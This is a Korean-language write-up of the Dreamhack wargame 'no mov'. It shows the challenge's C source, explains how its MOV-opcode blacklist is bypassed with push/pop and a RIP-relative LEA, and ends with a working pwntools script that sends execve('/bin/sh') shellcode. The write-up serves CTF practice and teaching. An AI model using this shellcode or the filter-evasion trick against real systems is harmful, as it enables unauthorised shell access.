# no mov

[문제 링크](https://dreamhack.io/wargame/challenges/1184)

## 소스 코드

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

void initialize() {
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stdin, 0, _IOLBF, 0);
    setvbuf(stderr, 0, _IOLBF, 0);
}

int verify(uint8_t *sh, int len) {
    const uint8_t banned[] = {
        0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8E, // MOV
        0xA0, 0xA1, 0xA2, 0xA3, // MOV
        0xA4, 0xA5, // MOVS
        0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, // MOV
        0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF, // MOV
        0xC6, 0xC7 // MOV
    };

    for (int i = 0; i < len; i++)
        for (int j = 0; j < sizeof(banned); j++)
            if (sh[i] == banned[j])
                return 0;
    
    return 1;
}

uint8_t *get_mmaped_page() {
    int urandom_fd = open("/dev/urandom", O_RDONLY);
    uint64_t addr;
    if (read(urandom_fd, &addr, sizeof(uint64_t)) != sizeof(uint64_t)) {
        puts("Failed to read /dev/urandom");
        return 0;
    }
    addr &= 0xffffffff000ul;

    close(urandom_fd);
    
    uint8_t *page = mmap((void *)addr, 0x1000, 7, MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
    if (page == MAP_FAILED || page != (uint8_t *) addr) {
        puts("Failed to mmap");
        return 0;
    }

    return page;
}

int main() {
    initialize();

    uint8_t *sh = get_mmaped_page();
    uint8_t *stack = get_mmaped_page();
    if (!sh || !stack) {
        puts("Failed mmap");
        return 1;
    }
    memset(sh, 0x90, 0x1000);
    memset(stack, 0, 0x1000);

    printf("Give me your shellcode > ");
    int len = read(0, sh, 0x800);

    if (verify(sh, len)) {
        // Setup return address
        *((uint64_t *)(stack + 0x7f8)) = (uint64_t)sh;

        // Initialize registers...
        asm("xor %rbx, %rbx");
        asm("xor %rcx, %rcx");
        asm("xor %rdx, %rdx");
        asm("xor %rdi, %rdi");
        asm("xor %rsi, %rsi");
        asm("xor %r8, %r8");
        asm("xor %r9, %r9");
        asm("xor %r10, %r10");
        asm("xor %r11, %r11");
        asm("xor %r12, %r12");
        asm("xor %r13, %r13");
        asm("xor %r14, %r14");
        asm("xor %r15, %r15");

        // Setup new stack frame
        asm("mov %0, %%rsp" :: "r"(stack + 0x7f8));
        asm("mov %0, %%rbp" :: "r"(stack + 0x800));
        asm("xor %rax, %rax");

        // Jump to shellcode
        asm("ret");
    } else {
        puts("No.");
    }
    return 0;
}
```

## 취약점 분석 

본 문제는 사용자로부터 쉘코드를 입력받아 실행하는 구조를 가지고 있지만, 실행 전 두 가지 조건이 존재합니다.  

- `verify` 함수를 통한 블랙리스트 필터링: MOV와 관련된 거의 모든 어셈블리 기계어(Opcode)가 banned 배열에 등록되어 있어, 레지스터에 값을 직접 대입하는 가장 일반적인 방법이 원천 차단됩니다.  

- 레지스터 초기화: 쉘코드로 점프(ret)하기 직전, `xor` 명령어를 통해 `rax`, `rdi`, `rsi`, `rdx`를 포함한 모든 범용 레지스터의 값을 0으로 초기화합니다.


**취약점 (Bypass Point)**

문제에는 MOV를 차단했지만, 스택을 활용하는 PUSH/POP 명령어와 주소를 계산하는 LEA(0x8D) 명령어는 필터링하지 않았습니다.

execve 시스템 콜에 필요한 rsi와 rdx 레지스터는 프로그램이 이미 0으로 초기화해 두었으므로, MOV 없이 rax와 rdi 두 개의 레지스터만 세팅하면 됩니다.


## 익스플로잇 구상

최종 목표는 execve("/bin/sh", NULL, NULL) 시스템 콜을 호출하여 쉘을 획득하는 것입니다. 이를 위해 다음과 같은 우회 전략을 구상합니다.

### rax 레지스터 세팅 (execve 시스템 콜 번호 59)

- MOV rax, 59가 불가능하므로, push 59 후 pop rax를 사용하여 우회합니다.


### rdi 레지스터 세팅 ("/bin/sh" 문자열 주소)

- mmap으로 할당된 쉘코드의 메모리 주소는 매번 랜덤하게 변합니다(ASLR).

- 이를 극복하기 위해 LEA 명령어와 RIP 상대 주소 지정(RIP-relative addressing) 기법을 사용합니다.

- 쉘코드의 실행 불가능한 영역(명령어의 끝부분)에 "/bin/sh\x00" 문자열 데이터를 배치하고, 실행 중인 RIP 위치를 기준으로 해당 문자열까지의 거리(Offset)를 계산하여 rdi에 주소를 적재합니다.

## 익스플로잇 코드

```python
from pwn import *
import sys

context.arch = 'amd64'

if len(sys.argv) == 3:
    p = remote(sys.argv[1], sys.argv[2])
else:
    p = process("./main")

shellcode = asm('''
push 59
pop rax

lea rdi, [rip + 2]

syscall

.ascii "/bin/sh\\0"
''')

p.sendafter(b"Give me your shellcode > ", shellcode)
p.interactive()
```